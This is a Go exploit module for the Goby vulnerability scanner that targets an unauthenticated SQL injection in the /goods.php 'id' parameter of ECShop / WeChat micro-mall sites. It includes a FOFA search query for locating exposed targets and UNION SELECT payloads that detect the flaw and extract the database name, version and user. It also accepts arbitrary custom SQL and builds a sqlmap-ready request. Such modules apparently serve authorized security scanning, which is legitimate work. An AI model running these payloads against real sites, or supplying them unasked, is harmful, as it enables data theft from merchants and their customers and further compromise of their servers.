package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ecshop /goods.php SQL Injection Vulnerability",
    "Description": "<p>The micro-mall system, also known as the WeChat mall system, is a small e-commerce system built based on social platforms such as WeChat. The system integrates the interactivity of social media and the transaction function of the online mall, providing merchants with a comprehensive e-commerce platform integrating commodity display, online trading, marketing promotion, user management, data analysis and other functions. The system makes full use of WeChat's social attributes and extensive user base, and builds a convenient online mall for merchants through WeChat official accounts or small programs. Users can complete the browsing, purchasing, and payment of products in WeChat without downloading additional apps, and enjoy a full range of shopping experiences. </p><p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.goods.php</p>",
    "Product": "ECShop",
    "Homepage": "http://www.ecshop.com/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-08-21",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/Mao_Public/layer/layer.js\" && body=\"/Mao_Public/js/Mao.js\"",
    "GobyQuery": "body=\"/Mao_Public/layer/layer.js\" && body=\"/Mao_Public/js/Mao.js\"",
    "Level": "1",
    "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.goods.php</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/141281655"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "'+UNION+ALL+SELECT+NULL,NULL,NULL,111*6,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "微商城系统 /goods.php SQL 注入漏洞",
            "Product": "ECShop",
            "Description": "<p>微商城系统，又称微信商城系统，是基于微信等社交平台构建的一种小型电子商务系统。该系统融合了社交媒体的互动性和网络商城的交易功能，为商家提供了一个集商品展示、在线交易、营销推广、用户管理、数据分析等功能于一体的综合性电商平台。系统充分利用了微信的社交属性和广泛的用户基础，通过微信公众号或小程序等形式，为商家搭建起一个便捷的在线商城。用户无需下载额外应用，即可在微信内完成商品的浏览、选购、支付等操作，享受全方位的购物体验。</p><p>微商城系统 goods.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>微商城系统 goods.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "ecshop /goods.php SQL Injection Vulnerability",
            "Product": "ECShop",
            "Description": "<p>The micro-mall system, also known as the WeChat mall system, is a small e-commerce system built based on social platforms such as WeChat. The system integrates the interactivity of social media and the transaction function of the online mall, providing merchants with a comprehensive e-commerce platform integrating commodity display, online trading, marketing promotion, user management, data analysis and other functions. The system makes full use of WeChat's social attributes and extensive user base, and builds a convenient online mall for merchants through WeChat official accounts or small programs. Users can complete the browsing, purchasing, and payment of products in WeChat without downloading additional apps, and enjoy a full range of shopping experiences.&nbsp;</p><p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.goods.php<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.goods.php<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9941"
}`
	setSqlPayloadHashasnhaundiunaskdhajvdsghatxaxsre := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		vulurl = "/goods.php"
		requestConfig := httpclient.NewGetRequestConfig(vulurl+"?id="+sql)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = fmt.Errorf("fail")
			return "", "", err
		}
		res = resp.RawBody
		return res, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "364ac83e24a9c25ee8c896892a2f96c9"
			// 无法通过计算MD5等计算手段判断是否存在注入，因此设置了一个随机的固定的值，用于判断是否存在注入，默认情况下不会出现这个值
			sql := `'+UNION+ALL+SELECT+NULL,NULL,NULL,md5('ascnadsasd'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `<li>((.|\n)*?)<img src="((.|\n)*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[3], nil
			}
			sendPayload := setSqlPayloadHashasnhaundiunaskdhajvdsghatxaxsre
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `GET /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,md5('ascnadsasd'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host: `+expResult.HostInfo.HostInfo

			// 3.配置正则语句，从响应包中提取出数据
			regular := `<li>((.|\n)*?)<img src="((.|\n)*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[3], nil
			}
			sendPayload := setSqlPayloadHashasnhaundiunaskdhajvdsghatxaxsre
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "'+UNION+ALL+SELECT+NULL,NULL,NULL,DATABASE(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
					} else if way == "db_version" {
						sql = "'+UNION+ALL+SELECT+NULL,NULL,NULL,VERSION(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
					} else if way == "user_name" {
						sql = "'+UNION+ALL+SELECT+NULL,NULL,NULL,USER(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
					}
				}
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
